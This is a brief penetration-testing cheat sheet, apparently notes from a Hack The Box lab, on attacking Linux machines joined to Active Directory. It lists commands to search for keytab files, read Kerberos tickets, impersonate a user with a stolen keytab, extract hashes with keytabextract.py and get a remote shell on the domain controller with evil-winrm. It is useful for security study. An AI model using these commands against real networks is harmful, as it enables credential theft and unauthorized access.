# Linux AD Integration


## Check If Linux Machine is Domain Joined

```bash
$ realm list
$ ps -ef | grep -i "winbind\|sssd"

```

## Search Keytab

```bash
$ find / -name *.keytab -ls 2>/dev/null
$ find / -name *keytab* -ls 2>/dev/null
```

`/etc/krb5.keytab --> linux$@manesec.com`

## Current Ticket

```bash
$ env | grep -i krb5
$ klist 
$ klist -k -t 
```


## Use Ticket

```bash
$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/xxx/carlos.keytab
$ smbclient //dc01/carlos -k -c ls

$ export KRB5CCNAME=xxx.ccache
```

## Extract hash from keytab

```bash
$ python3 /opt/keytabextract.py /opt/xxx/carlos.keytab 
$ su - carlos@inlanefreight.htb
```

## evil-winrm with Kerberos

```bash
$ sudo apt-get install krb5-user -y
$ sudo dpkg-reconfigure krb5-config
$ cat /etc/krb5.conf
[libdefaults]
        default_realm = INLANEFREIGHT.HTB

<SNIP>

[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

<SNIP>

$ evil-winrm -i dc01 -r inlanefreight.htb
```